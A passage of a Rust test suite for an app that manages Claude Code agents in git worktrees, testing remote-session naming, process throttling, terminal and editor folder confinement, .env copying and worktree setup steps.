    let told = |h: &Harness| {
        h.items(&id)
            .iter()
            .filter(|i| {
                i["kind"] == "notice"
                    && i["text"]
                        .as_str()
                        .is_some_and(|t| t.starts_with("Remote control indisponible : boom"))
            })
            .count()
    };
    let boom = anyhow::anyhow!("boom");
    // Its process stops, so that the next start is the one that links it.
    h.core.ensure_process(&id).await.unwrap();
    tokio::time::sleep(Duration::from_millis(300)).await;
    h.core
        .agent(&id)
        .unwrap()
        .lock()
        .detach()
        .unwrap()
        .close_input();
    {
        let a = h.core.agent(&id).unwrap();
        let mut rt = a.lock();
        rt.meta.remote_control = true;
        rt.meta.remote_source = Some(RemoteSource::Hand);
    }
    // Every start that fails tells it again: once is enough.
    for _ in 0..3 {
        h.core.remote_unavailable(&id, &boom, true);
    }
    assert_eq!(told(&h), 1);
    // A link that works: the next failure is news again.
    h.core.start_remote_agents();
    h.wait_remote(&id, Some(RemoteSource::Hand)).await;
    h.core.remote_unavailable(&id, &boom, true);
    h.core.remote_unavailable(&id, &boom, true);
    assert_eq!(told(&h), 2);
    // So is the one that follows the user turning it on by hand.
    h.core.set_remote_control(&id, true).await.unwrap();
    h.core.remote_unavailable(&id, &boom, true);
    assert_eq!(told(&h), 3);
}

#[tokio::test]
async fn renaming_a_project_renames_the_remote_sessions_of_the_agents_linked_to_claude_ai() {
    let h = harness("remote-project-rename");
    let (p, r) = h.project(false).await;
    let linked = h.core.create_agent(&p.id, None).await.unwrap().meta;
    let local = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.core.set_remote_control(&linked.id, true).await.unwrap();
    // A process that is not linked to claude.ai has no session there to rename.
    h.core.ensure_process(&local).await.unwrap();
    let titles = |h: &Harness| -> Vec<String> {
        h.fake_log(&r, "rename")
            .iter()
            .map(|t| {
                assert_eq!(t["source"], "host");
                t["title"].as_str().unwrap().to_string()
            })
            .collect()
    };
    assert!(titles(&h).is_empty());

    // The project's other settings change nothing there.
    let mut project = h.core.project(&p.id).unwrap();
    project.color = "oklch(0.6 0.1 20)".into();
    h.core.update_project(project.clone()).unwrap();
    // Its name: « projet · agent » in claude.ai follows.
    project.name = "renamed".into();
    h.core.update_project(project).unwrap();
    h.wait("the session renamed", |h| !titles(h).is_empty())
        .await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert_eq!(titles(&h), [format!("renamed · {}", linked.name)]);
}

#[tokio::test]
async fn a_setting_starts_three_processes_at_most_at_once() {
    let h = harness("remote-throttle");
    let (p, _) = h.project(true).await;
    let mut ids = Vec::new();
    for _ in 0..6 {
        ids.push(h.core.create_agent(&p.id, None).await.unwrap().meta.id);
    }
    // Their warm-ups over, their processes stop: the ones the setting starts are the next.
    let ready = |h: &Harness, id: &String| !h.core.agent(id).unwrap().lock().commands.is_empty();
    h.wait("the warm-ups", |h| ids.iter().all(|id| ready(h, id)))
        .await;
    for id in &ids {
        let a = h.core.agent(id).unwrap();
        let mut rt = a.lock();
        rt.detach().unwrap().close_input();
        rt.commands.clear();
        // Each one's start takes its time to be answered.
        h.fake_slow(Path::new(&rt.meta.cwd), "initialize", 600);
    }
    // How many are starting at once: a process attached whose start is not answered yet.
    let stop = Arc::new(AtomicBool::new(false));
    let (core, done) = (h.core.clone(), stop.clone());
    let sampler = std::thread::spawn(move || {
        let mut peak = 0;
        while !done.load(Ordering::Acquire) {
            let starting = core
                .agents
                .read()
                .values()
                .filter(|a| {
                    let rt = a.lock();
                    rt.proc.is_some() && rt.commands.is_empty()
                })
                .count();
            peak = peak.max(starting);
            std::thread::sleep(Duration::from_millis(2));
        }
        peak
    });
    h.remote_all(true);
    for id in &ids {
        h.wait_remote(id, Some(RemoteSource::Global)).await;
    }
    stop.store(true, Ordering::Release);
    // Three at most (the sampler may miss the moment the third is attached), and some.
    let peak = sampler.join().unwrap();
    assert!((1..=3).contains(&peak), "{peak} starting at once");
}

#[tokio::test]
async fn a_remote_session_a_setting_gave_keeps_its_name_and_comes_back_after_a_restart() {
    let h = harness("remote-setting-reattach");
    let (p, r) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.remote_all(true);
    h.wait_remote(&id, Some(RemoteSource::Global)).await;
    let m = h.agent(&id);
    let session = m.remote_session.clone().unwrap();
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["name"], format!("demo · {}", m.name));
    assert_eq!(req["keep_session_on_exit"], true);

    let old = h.core.agent(&id).unwrap().lock().detach().unwrap();
    old.close_input();
    h.core.ensure_process(&id).await.unwrap();
    let req = h.remote_requests(&r).pop().unwrap();
    assert_eq!(req["reattach_session_id"], session.as_str());
    assert_eq!(req["name"], format!("demo · {}", m.name));
    assert_eq!(
        h.agent(&id).remote_session.as_deref(),
        Some(session.as_str())
    );
}

#[tokio::test]
async fn a_deleted_agent_is_never_sent_back_to_the_ui() {
    let h = harness("delete-late");
    let (p, _) = h.project(false).await;
    let id = h.core.create_agent(&p.id, None).await.unwrap().meta.id;
    h.turn(&id, "Bonjour").await;
    h.core.delete_agent(&id, false).await.unwrap();
    // The killed process exits afterwards: that must not bring the agent back.
    tokio::time::sleep(Duration::from_millis(1500)).await;
    let events = h.events.lock();
    let removed = events
        .iter()
        .position(|e| e["type"] == "agentRemoved" && e["id"] == id.as_str())
        .expect("removal sent");
    let late: Vec<&Value> = events[removed..]
        .iter()
        .filter(|e| e["type"] == "agent" && e["agent"]["id"] == id.as_str())
        .collect();
    assert!(
        late.is_empty(),
        "agent sent again after its removal: {late:?}"
    );
}

#[tokio::test]
async fn launch_commands_are_saved_with_the_project() {
    let h = harness("run-config");
    let (p, _) = h.project(false).await;
    let cmd = RunCommand {
        id: "c1".into(),
        name: "Front".into(),
        command: "npm run dev".into(),
        shell: "pwsh".into(),
        cwd: "web".into(),
    };
    h.core
        .update_project(Project {
            run_commands: vec![cmd.clone()],
            ..p.clone()
        })
        .unwrap();
    assert_eq!(h.core.project(&p.id).unwrap().run_commands, vec![cmd]);
    h.core.save_now();
    let saved = std::fs::read_to_string(h.dir.join("data").join("state.json")).unwrap();
    assert!(saved.contains("npm run dev"), "{saved}");
}

#[tokio::test]
async fn the_editor_reads_and_writes_the_checkout_of_its_source() {
    let h = harness("core-edit-root");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    std::fs::write(wt.join("src").join("app.ts"), "const a = 3;\n").unwrap();

    let (root, base) = h
        .core
        .edit_root(&p.id, Some(a.meta.id.clone()))
        .await
        .unwrap();
    assert_eq!(
        Path::new(&root).canonicalize().unwrap(),
        wt.canonicalize().unwrap()
    );
    assert_eq!(base.as_deref(), Some("main"));
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 3;\n"));

    let (root, base) = h.core.edit_root(&p.id, None).await.unwrap();
    assert_eq!(
        Path::new(&root).canonicalize().unwrap(),
        r.canonicalize().unwrap()
    );
    assert_eq!(base, None);
    let t = crate::fsedit::read(Path::new(&root), "src/app.ts").unwrap();
    assert_eq!(t.text.as_deref(), Some("const a = 1;\n"));
}

/// The folder `term_cwd` gave, as the disk spells it (Windows adds `\\?\` to a canonical path).
fn same_dir(cwd: &str, expected: &Path) -> bool {
    Path::new(cwd).canonicalize().unwrap() == expected.canonicalize().unwrap()
}

#[tokio::test]
async fn a_terminal_opens_in_the_worktree_of_an_agent_or_the_project_and_in_a_folder_of_it() {
    let h = harness("core-term-cwd-worktree");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    let id = Some(a.meta.id.clone());

    // No agent: the project's folder, as every terminal opened before this did.
    assert_eq!(
        h.core.term_cwd(&p.id, None, None).await.unwrap(),
        p.path.as_str()
    );
    // An agent with a worktree: its worktree, not the project's checkout.
    let cwd = h.core.term_cwd(&p.id, id.clone(), None).await.unwrap();
    assert!(same_dir(&cwd, &wt), "{cwd}");
    // A folder of the source: in the worktree for the agent, in the project otherwise.
    let cwd = h
        .core
        .term_cwd(&p.id, id.clone(), Some("src"))
        .await
        .unwrap();
    assert!(same_dir(&cwd, &wt.join("src")), "{cwd}");
    let cwd = h.core.term_cwd(&p.id, None, Some("src")).await.unwrap();
    assert!(same_dir(&cwd, &r.join("src")), "{cwd}");
    // The tree's `/` does not end up mixed with a Windows path's `\`.
    std::fs::create_dir_all(wt.join("src").join("deep")).unwrap();
    let cwd = h
        .core
        .term_cwd(&p.id, id.clone(), Some("src/deep"))
        .await
        .unwrap();
    assert_eq!(cwd, wt.join("src").join("deep").to_string_lossy());
    // An empty folder is no folder.
    let cwd = h.core.term_cwd(&p.id, id, Some("  ")).await.unwrap();
    assert!(same_dir(&cwd, &wt), "{cwd}");
}

#[tokio::test]
async fn a_terminal_for_an_agent_without_a_worktree_opens_in_the_project() {
    let h = harness("core-term-cwd-no-worktree");
    let (p, r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert!(a.meta.worktree.is_none());
    let id = Some(a.meta.id.clone());

    assert_eq!(
        h.core.term_cwd(&p.id, id.clone(), None).await.unwrap(),
        p.path.as_str()
    );
    let cwd = h.core.term_cwd(&p.id, id, Some("src")).await.unwrap();
    assert!(same_dir(&cwd, &r.join("src")), "{cwd}");
}

#[tokio::test]
async fn a_terminal_stays_in_the_source_it_is_asked_for() {
    let h = harness("core-term-cwd-confined");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = Some(a.meta.id.clone());
    let outside = r.parent().unwrap().to_string_lossy().to_string();

    for source in [None, id.clone()] {
        for sub in ["..", "../..", "src/../..", outside.as_str()] {
            let err = h
                .core
                .term_cwd(&p.id, source.clone(), Some(sub))
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("hors du dossier"), "{sub}: {err}");
        }
        // A folder that is not one, or not there.
        for sub in ["src/app.ts", "nope"] {
            let err = h
                .core
                .term_cwd(&p.id, source.clone(), Some(sub))
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains(sub), "{sub}: {err}");
        }
    }
    // An agent the app does not know opens nothing in the project instead.
    assert!(h
        .core
        .term_cwd(&p.id, Some("ghost".into()), None)
        .await
        .is_err());
}

#[tokio::test]
async fn a_terminal_is_refused_for_an_agent_whose_worktree_vanished() {
    let h = harness("core-term-cwd-gone");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&a.meta.id)).await;
    if let Some(proc) = h.core.agent(&a.meta.id).unwrap().lock().detach() {
        proc.kill();
    }
    remove_once_let_go(&wt.path).await;

    // Not a shell opened elsewhere, in the app's own folder, as if it were the worktree.
    for sub in [None, Some("src")] {
        let err = h
            .core
            .term_cwd(&p.id, Some(a.meta.id.clone()), sub)
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("worktree"), "{sub:?}: {err}");
    }
}

#[tokio::test]
async fn the_file_manager_selects_a_file_or_folder_of_the_source_or_opens_its_folder() {
    use crate::fsedit::Reveal;
    let h = harness("core-reveal-target");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.clone().unwrap().path);
    let id = Some(a.meta.id.clone());
    std::fs::create_dir_all(wt.join("src").join("deep")).unwrap();
    let opened = |t: Reveal| match t {
        Reveal::Open(dir) => dir,
        other => panic!("{other:?}"),
    };
    let selected = |t: Reveal| match t {
        Reveal::Select(path) => path,
        other => panic!("{other:?}"),
    };

    // The free space: the folder of the source opened, the project's or the agent's worktree.
    let dir = opened(h.core.reveal_target(&p.id, None, None).await.unwrap());
    assert!(same_dir(&dir.to_string_lossy(), &r), "{dir:?}");
    let dir = opened(h.core.reveal_target(&p.id, id.clone(), None).await.unwrap());
    assert!(same_dir(&dir.to_string_lossy(), &wt), "{dir:?}");
    let dir = opened(
        h.core
            .reveal_target(&p.id, id.clone(), Some(" "))
            .await
            .unwrap(),
    );
    assert!(same_dir(&dir.to_string_lossy(), &wt), "{dir:?}");

    // A file or a folder of the tree: selected, in the source shown.
    let file = selected(
        h.core
            .reveal_target(&p.id, None, Some("src/app.ts"))
            .await
            .unwrap(),
    );
    assert!(
        same_dir(&file.to_string_lossy(), &r.join("src").join("app.ts")),
        "{file:?}"
    );
    let file = selected(
        h.core
            .reveal_target(&p.id, id.clone(), Some("src/app.ts"))
            .await
            .unwrap(),
    );
    // Joined by components below a worktree's root: the tree's `/` is not mixed with its `\`.
    assert_eq!(file, wt.join("src").join("app.ts"));
    let dir = selected(
        h.core
            .reveal_target(&p.id, id.clone(), Some("src/deep"))
            .await
            .unwrap(),
    );
    assert_eq!(dir, wt.join("src").join("deep"));
    // A name is taken as written: one starting with a space is not another file.
    std::fs::write(wt.join(" lead.ts"), "").unwrap();
    let file = selected(
        h.core
            .reveal_target(&p.id, id, Some(" lead.ts"))
            .await
            .unwrap(),
    );
    assert_eq!(file, wt.join(" lead.ts"));
}

#[tokio::test]
async fn the_file_manager_takes_no_path_spelled_outside_the_source_nor_one_not_there() {
    let h = harness("core-reveal-confined");
    let (p, r) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = Some(a.meta.id.clone());
    let outside = r.parent().unwrap().to_string_lossy().to_string();

    for source in [None, id.clone()] {
        for path in ["..", "../..", "src/../..", outside.as_str()] {
            let err = h
                .core
                .reveal_target(&p.id, source.clone(), Some(path))
                .await
                .unwrap_err()
                .to_string();
            assert!(err.contains("hors du dossier"), "{path}: {err}");
        }
        let err = h
            .core
            .reveal_target(&p.id, source.clone(), Some("src/gone.ts"))
            .await
            .unwrap_err()
            .to_string();
        assert_eq!(err, "src/gone.ts introuvable");
    }
    // An agent the app does not know shows nothing of the project instead.
    assert!(h
        .core
        .reveal_target(&p.id, Some("ghost".into()), None)
        .await
        .is_err());
}

#[tokio::test]
async fn the_editor_says_so_when_the_worktree_of_its_agent_vanished() {
    let h = harness("core-edit-root-gone");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    h.wait("warm-up", |h| h.alive(&a.meta.id)).await;
    if let Some(proc) = h.core.agent(&a.meta.id).unwrap().lock().detach() {
        proc.kill();
    }
    remove_once_let_go(&wt.path).await;

    // The tree, the search, a file read or written, a rename: the same words, not the system's.
    let id = Some(a.meta.id.clone());
    let gone = "Le worktree de l'agent n'existe plus";
    let e = h.core.edit_root(&p.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), gone);
    let e = h.core.fs_tree(&p.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), gone);
    let e = h.core.edit_kept(&p.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), gone);
    // Nor shown in the system's file manager: not the app's own folder in its place.
    for path in [None, Some("src/app.ts")] {
        let e = h
            .core
            .reveal_target(&p.id, id.clone(), path)
            .await
            .unwrap_err();
        assert_eq!(e.to_string(), gone, "{path:?}");
    }
    // Nothing made again where the worktree was.
    assert!(!Path::new(&wt.path).exists());
    // The project's own files are still there to edit.
    assert!(h.core.edit_root(&p.id, None).await.is_ok());
}

#[tokio::test]
async fn the_editor_and_terminals_take_no_agent_of_another_project() {
    let h = harness("core-edit-root-foreign");
    let (p, _) = h.project(true).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let other_dir = h.dir.join("other");
    std::fs::create_dir_all(&other_dir).unwrap();
    let other = h
        .core
        .create_project(
            &other_dir.to_string_lossy(),
            "other",
            "oklch(0.72 0.12 48)",
            false,
            None,
            true,
        )
        .await
        .unwrap();
    let id = Some(a.meta.id.clone());

    // Its worktree is not the other project's folder to edit, nor to open a shell in.
    let refused = "agent introuvable dans ce projet";
    let e = h.core.edit_root(&other.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), refused);
    let e = h.core.edit_kept(&other.id, id.clone()).await.unwrap_err();
    assert_eq!(e.to_string(), refused);
    let e = h
        .core
        .term_cwd(&other.id, id.clone(), None)
        .await
        .unwrap_err();
    assert_eq!(e.to_string(), refused);
    // In its own project, its worktree.
    let (root, base) = h.core.edit_root(&p.id, id).await.unwrap();
    assert!(same_dir(&root, Path::new(&a.meta.worktree.unwrap().path)));
    assert_eq!(base.as_deref(), Some("main"));
}

#[tokio::test]
async fn the_editor_tree_shows_the_files_the_project_copies_into_its_worktrees() {
    let h = harness("core-edit-tree-copied");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env*");
    ignore(&r, "node_modules/");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    std::fs::create_dir_all(r.join("node_modules")).unwrap();
    std::fs::write(r.join("node_modules").join("x.js"), "x\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();

    // The project's checkout and the agent's worktree, where the copy put it: the copied file is
    // listed and marked ignored, the dependencies are not there.
    for source in [None, Some(a.meta.id.clone())] {
        let t = h.core.fs_tree(&p.id, source.clone()).await.unwrap();
        assert_eq!(t.ignored, [".env"], "{source:?}");
        assert!(t.files.contains(&".env".to_string()), "{source:?}");
        assert!(!t.files.iter().any(|f| f.starts_with("node_modules")));
    }

    // The patterns are the project's own: none, nothing more than git lists.
    h.core
        .update_project(Project {
            worktree_copy: Vec::new(),
            ..p.clone()
        })
        .unwrap();
    let t = h.core.fs_tree(&p.id, None).await.unwrap();
    assert!(t.ignored.is_empty() && !t.files.contains(&".env".to_string()));
}

#[tokio::test]
async fn the_editor_tree_of_a_project_in_a_subfolder_shows_the_files_copied_from_that_folder() {
    let h = harness("core-edit-tree-copied-below");
    let (_, r) = h.project(false).await;
    ignore(&r, ".env*");
    let sub = r.join("packages").join("web");
    std::fs::create_dir_all(&sub).unwrap();
    std::fs::write(
        sub.join("index.ts"),
        "x
",
    )
    .unwrap();
    git(&r, &["add", "-A"]);
    git(&r, &["commit", "-qm", "web"]);
    std::fs::write(
        sub.join(".env"),
        "SECRET=1
",
    )
    .unwrap();
    let p = h
        .core
        .create_project(
            &sub.to_string_lossy(),
            "web",
            "oklch(0.72 0.12 48)",
            true,
            None,
            true,
        )
        .await
        .unwrap();
    let t = h.core.fs_tree(&p.id, None).await.unwrap();
    assert_eq!(t.ignored, ["packages/web/.env"]);
    assert!(t.files.contains(&"packages/web/index.ts".to_string()));

    // The agent's worktree is the checkout's root: the copy put `.env` where it is in the repository.
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let t = h.core.fs_tree(&p.id, Some(a.meta.id)).await.unwrap();
    assert!(t.ignored.iter().all(|f| t.files.contains(f)));
}

#[tokio::test]
async fn the_editor_keeps_the_folders_and_worktrees_of_every_project_of_the_repository() {
    let h = harness("core-edit-kept");
    let (whole, r) = h.project(true).await;
    // Two more projects in folders of the same repository, each with an agent in a worktree.
    let mut subs = Vec::new();
    for name in ["api", "web"] {
        let dir = r.join("packages").join(name);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join("index.ts"), "x\n").unwrap();
        git(&r, &["add", "-A"]);
        git(&r, &["commit", "-qm", name]);
        let p = h
            .core
            .create_project(
                &dir.to_string_lossy(),
                name,
                "oklch(0.72 0.12 48)",
                true,
                None,
                true,
            )
            .await
            .unwrap();
        // Its worktree at once, not at its first message (ESC-156).
        let p = Project {
            worktree_at_first_message: false,
            ..p
        };
        h.core.update_project(p.clone()).unwrap();
        h.core.create_agent(&p.id, None).await.unwrap();
        subs.push(p);
    }
    let sent = std::cell::RefCell::new(Vec::new());
    let send = |p: &Path| {
        sent.borrow_mut().push(p.to_path_buf());
        Ok(())
    };
    // From `web`, whose source is the repository: the other project and its agents' checkouts too.
    let (root, kept) = h.core.edit_kept(&subs[1].id, None).await.unwrap();
    let root = Path::new(&root);
    for rel in [
        "packages/api",
        "packages/api/.claude",
        "packages",
        "packages/web",
    ] {
        let err = crate::fsedit::delete(root, rel, &kept, send)
            .unwrap_err()
            .to_string();
        assert!(
            err.contains("projet") || err.contains("worktree"),
            "{rel}: {err}"
        );
        assert!(
            crate::fsedit::rename(root, rel, "moved", &kept).is_err(),
            "{rel}"
        );
    }
    // From the project at the root of the repository: the same.
    let (_, kept) = h.core.edit_kept(&whole.id, None).await.unwrap();
    for rel in ["packages/web", "packages/api/.claude"] {
        assert!(
            crate::fsedit::delete(root, rel, &kept, send).is_err(),
            "{rel}"
        );
    }
    assert!(sent.borrow().is_empty());
    // Their files are files like any other.
    crate::fsedit::delete(root, "packages/api/index.ts", &kept, send).unwrap();
    assert_eq!(sent.borrow().len(), 1);
}

#[tokio::test]
async fn quitting_with_unsaved_files_asks_the_window_first() {
    use std::sync::atomic::Ordering;
    let h = harness("core-quit-unsaved");
    assert!(!h.core.ask_before_quit());
    h.core.unsaved.store(2, Ordering::Release);
    assert!(h.core.ask_before_quit());
    assert!(h
        .events
        .lock()
        .iter()
        .any(|e| e["type"] == "quitRequested" && e["unsaved"] == 2));
}

#[tokio::test]
async fn a_reloaded_window_holds_no_unsaved_file_any_more() {
    use std::sync::atomic::Ordering;
    let h = harness("core-unsaved-reload");
    h.core.unsaved.store(2, Ordering::Release);
    h.core.reset_unsaved();
    assert!(!h.core.ask_before_quit());
}

#[tokio::test]
async fn an_agent_made_for_a_ticket_has_its_branch_from_a_base_and_the_projects_env_files() {
    let h = harness("tk-agent-options");
    let (p, r) = h.project(false).await;
    git(&r, &["checkout", "-qb", "release"]);
    commit_change(&r, "const a = 9;\n", "release");
    git(&r, &["checkout", "-q", "main"]);
    ignore(&r, ".env*");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    std::fs::write(r.join(".env.local"), "X=2\n").unwrap();
    std::fs::write(r.join("notes.txt"), "n\n").unwrap();
    let options = || AgentOptions {
        name: Some("dem-1-ajouter".into()),
        worktree: Some(("ticket/dem-1".into(), "release".into())),
        model: Some("opus".into()),
        effort: Some("max".into()),
        mode: Some("plan".into()),
        append_prompt: Some("Protocole".into()),
        ticket_id: Some("t1".into()),
        port_base: Some(4100),
        ..Default::default()
    };
    let a = h.core.create_agent_with(&p.id, options()).await.unwrap();
    let wt = a.meta.worktree.clone().unwrap();
    assert_eq!(
        (wt.branch.as_str(), wt.base_branch.as_str()),
        ("ticket/dem-1", "release")
    );
    let dir = PathBuf::from(&wt.path);
    assert_eq!(
        std::fs::read_to_string(dir.join("src").join("app.ts")).unwrap(),
        "const a = 9;\n"
    );
    assert_eq!(
        std::fs::read_to_string(dir.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert!(dir.join(".env.local").exists() && !dir.join("notes.txt").exists());
    assert_eq!(
        (a.meta.name.as_str(), a.meta.named),
        ("dem-1-ajouter", true)
    );
    assert_eq!(
        (
            a.meta.model.as_str(),
            a.meta.effort.as_str(),
            a.meta.mode.as_str()
        ),
        ("opus", "max", "plan")
    );
    // Started in Plan: its plan approved, it goes on in its account's mode of new agents
    // (ESC-277), never in « Demander » by default.
    h.set_settings(|s| s.accounts[0].default_mode = "bypassPermissions".into());
    let b = h
        .core
        .create_agent_with(
            &p.id,
            AgentOptions {
                mode: Some("plan".into()),
                ..Default::default()
            },
        )
        .await
        .unwrap();
    assert_eq!(b.meta.account, h.core.settings.read().accounts[0].id);
    assert_eq!(b.meta.plan_from.as_deref(), Some("bypassPermissions"));
    assert_eq!(b.meta.plan_resume(true), "bypassPermissions");
    assert_eq!(
        (
            a.meta.ticket_id.as_deref(),
            a.meta.port_base,
            a.meta.append_prompt.as_deref()
        ),
        (
            Some("t1"),
            Some(4100),
            crate::core::with_memory(crate::i18n::Lang::Fr, Some("Protocole".into())).as_deref()
        )
    );
    // Made by the board, not by the user: the sidebar keeps its selection.
    assert_ne!(h.core.ui.read().selected_agent.get(&p.id), Some(&a.meta.id));
    // The same branch asked again: a suffix, for the name too.
    let b = h.core.create_agent_with(&p.id, options()).await.unwrap();
    assert_eq!(b.meta.worktree.unwrap().branch, "ticket/dem-1-2");
    assert_eq!(b.meta.name, "dem-1-ajouter-2");
    // A base that does not exist: no agent at all.
    let before = h.core.agents.read().len();
    let bad = AgentOptions {
        worktree: Some(("ticket/dem-9".into(), "nowhere".into())),
        ..options()
    };
    assert!(h.core.create_agent_with(&p.id, bad).await.is_err());
    assert_eq!(h.core.agents.read().len(), before);
    // The protocol rides along at its start.
    h.core.ensure_process(&a.meta.id).await.unwrap();
    let argv = h.launches(&dir).pop().unwrap();
    let i = argv
        .iter()
        .position(|x| x == "--append-system-prompt")
        .unwrap();
    assert_eq!(
        Some(argv[i + 1].clone()),
        crate::core::with_memory(crate::i18n::Lang::Fr, Some("Protocole".into()))
    );
}

#[tokio::test]
async fn a_worktree_agent_gets_only_the_env_files_git_ignores() {
    let h = harness("tk-agent-env");
    let (p, r) = h.project(true).await;
    ignore(&r, ".env");
    std::fs::write(r.join(".env"), "SECRET=1\n").unwrap();
    // Untracked but not ignored: copied, it would be the agent's change, offered for commit.
    std::fs::write(r.join(".env.local"), "X=2\n").unwrap();
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let wt = PathBuf::from(a.meta.worktree.unwrap().path);
    assert_eq!(
        std::fs::read_to_string(wt.join(".env")).unwrap(),
        "SECRET=1\n"
    );
    assert!(!wt.join(".env.local").exists());
    // Nothing of what was copied shows as a change of the agent.
    assert_eq!(git(&wt, &["status", "--porcelain"]), "");
}

#[tokio::test]
async fn an_agent_created_by_the_user_is_selected_and_left_for_haiku_to_name() {
    let h = harness("tk-agent-default");
    let (p, _r) = h.project(false).await;
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    assert_eq!((a.meta.name.as_str(), a.meta.named), ("agent-1", false));
    assert_eq!(h.core.ui.read().selected_agent.get(&p.id), Some(&a.meta.id));
}

// ---------- worktree setup and teardown ----------

/// The worktree at `path` removed as the app does it, tried again while something still holds the
/// folder for a moment (Windows).
async fn remove_worktree_eventually(repo: &Path, path: &str) {
    let repo = repo.to_string_lossy();
    for _ in 0..50 {
        let removed = crate::git::worktree_remove_dir(&repo, path).await;
        if removed.is_ok() && !Path::new(path).exists() {
            return;
        }
        tokio::time::sleep(Duration::from_millis(200)).await;
    }
    panic!("{path} not removed");
}

/// A worktree step run by the system's first shell.
pub(crate) fn wt_step(command: &str, cwd: &str) -> WorktreeStep {
    WorktreeStep {
        id: uuid::Uuid::new_v4().to_string(),
        command: command.into(),
        shell: String::new(),
        cwd: cwd.into(),
    }
}

impl Harness {
    pub(crate) fn set_worktree_steps(
        &self,
        project_id: &str,
        setup: Vec<WorktreeStep>,
        teardown: Vec<WorktreeStep>,
    ) {
        self.core
            .update_project(Project {
                worktree_setup: setup,
                worktree_teardown: teardown,
                ..self.core.project(project_id).unwrap()
            })
            .unwrap();
    }

    pub(crate) fn view(&self, id: &str) -> AgentView {
        self.core.agent(id).unwrap().lock().view()
    }

    fn notices(&self, id: &str, level: &str) -> Vec<String> {
        self.items(id)
            .iter()
            .filter(|i| i["kind"] == "notice" && i["level"] == level)
            .map(|i| i["text"].as_str().unwrap().to_string())
            .collect()
    }
}

#[tokio::test]
async fn a_new_worktree_is_set_up_before_its_agent_takes_a_message() {
    let h = harness("wt-setup");
    let (p, _) = h.project(true).await;
    let first = r#"node -e "setTimeout(() => require('fs').writeFileSync('ready.txt', process.env.ESCOUADE_BRANCH), 1500)""#;
    h.set_worktree_steps(
        &p.id,
        vec![
            wt_step(first, ""),
            wt_step(
                r#"node -e "require('fs').writeFileSync('second.txt', require('fs').readFileSync('../ready.txt'))""#,
                "src",
            ),
        ],
        vec![],
    );
    let a = h.core.create_agent(&p.id, None).await.unwrap();
    let id = a.meta.id.clone();
    let wt = a.meta.worktree.clone().unwrap();
    let dir = PathBuf::from(&wt.path);
    // Made at once, its setup under way.
    assert_eq!(
        a.setup,
        Some(format!(
            "1/2 · {}",
            crate::worktrees::label(&wt_step(first, ""))
        ))
    );
    // Claude Code does not start before it is over (its hooks and MCP servers would meet a
    // worktree half set up), then starts at once.
    tokio::time::sleep(Duration::from_millis(500)).await;
    assert!(!h.alive(&id));
    h.wait("started once set up", |h| h.alive(&id)).await;
    assert!(dir.join("src").join("second.txt").exists());
    h.turn(&id, "Bonjour").await;
    // The message went once the setup was over: both steps ran, in order, each in its folder.
    assert_eq!(
        std::fs::read_to_string(dir.join("ready.txt")).unwrap(),
        wt.branch
    );
    assert_eq!(
        std::fs::read_to_string(dir.join("src").join("second.txt")).unwrap(),
        wt.branch
    );
    assert_eq!(h.view(&id).setup, None);
    let items = h.items(&id);
    let ready = items.iter().position(|i| {
        i["kind"] == "notice"
            && i["text"]
                .as_str()
                .unwrap()
                .starts_with("Worktree préparé (2 commandes")
    });
    let user = items.iter().position(|i| i["kind"] == "user");
    assert!(ready.is_some() && ready < user, "{items:?}");
    assert!(h.events.lock().iter().any(|e| e["type"] == "agent"
        && e["agent"]["id"] == id.as_str()
        && e["agent"]["setup"]
            .as_str()
            .is_some_and(|s| s.starts_with("2/2 · "))));
}

/// The lines of the agent's setup the window was sent, step by step: (step, total, lines) of each.
fn setup_events(h: &Harness, id: &str) -> Vec<(u64, u64, Vec<String>)> {
    h.events
        .lock()
        .iter()
        .filter(|e| e["type"] == "setupOutput" && e["agentId"] == id)
        .map(|e| {
            let lines = e["lines"]
                .as_array()
                .unwrap()
                .iter()
                .map(|l| l.as_str().unwrap().to_string())
                .collect();
            (
                e["step"].as_u64().unwrap(),
                e["total"].as_u64().unwrap(),
                lines,
            )
        })
        .collect()
}

#[tokio::test]
async fn the_setup_shows_the_output_of_its_step_as_it_comes_and_logs_all_of_it() {
    let h = harness("wt-setup-output");
    let (p, _) = h.project(true).await;
